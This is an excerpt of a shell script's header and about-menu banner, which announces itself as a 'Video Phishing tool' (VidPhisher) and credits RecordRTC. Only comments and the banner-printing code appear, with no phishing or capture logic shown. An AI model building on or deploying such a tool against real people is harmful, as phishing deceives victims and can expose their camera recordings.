...
# Version    : 1.1
# Author     : Kuczi$
# Github     : https://github.com/KucziSa
# Email      : info@mysocials.pl
# Credits    : TechChipNet, RecordRTC
# Date       : 05-06-2022
# License    : GPLv3
# Copyright  : Kuczi$ 2022
# Language   : Shell
# Portable File
...
# Select template
    if echo $option | grep -q "1"; then
        ...
        clear
        echo -e "$lol"
        echo -e "$red[ToolName]  ${cyan}  :[Kuczi$]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Video Phishing tool]
$red[Author]     ${cyan} :[Kuczi$]
$red[Github]     ${cyan} :[https://github.com/KucziSa]
$red[Email]      ${cyan} :[info@mysocials.pl]"
        printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read about
